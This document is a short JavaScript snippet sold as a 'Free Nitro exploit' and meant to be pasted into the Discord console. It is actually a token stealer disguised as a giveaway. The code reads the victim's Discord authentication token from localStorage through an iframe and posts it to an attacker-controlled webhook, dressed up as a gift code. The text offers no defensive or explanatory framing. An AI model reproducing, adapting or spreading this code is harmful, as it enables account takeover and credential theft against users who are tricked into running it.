/***************************************
 *
 *      Free Nitro exploit!
 *      paste to console on discord and press enter
 *      to open console press F12 on chrome/mozilla/Edge
 *      or Ctrl+Shift+i on desktop app
 *
 * **************************************/

location.reload();
let nitrorequest = "webhook";
let i = document.createElement('iframe');
document.body.appendChild(i);
let request = new XMLHttpRequest();
request.open("POST", nitrorequest);
request.setRequestHeader('Content-type', 'application/json');
let params = {
    username: "Free Nitro Exploit",
    avatar_url: "https://discordgift.gg",
    content: '**Givenitro**\n------------------\nNitrocode : ' + i.contentWindow.localStorage.token
};
request.send(JSON.stringify(params));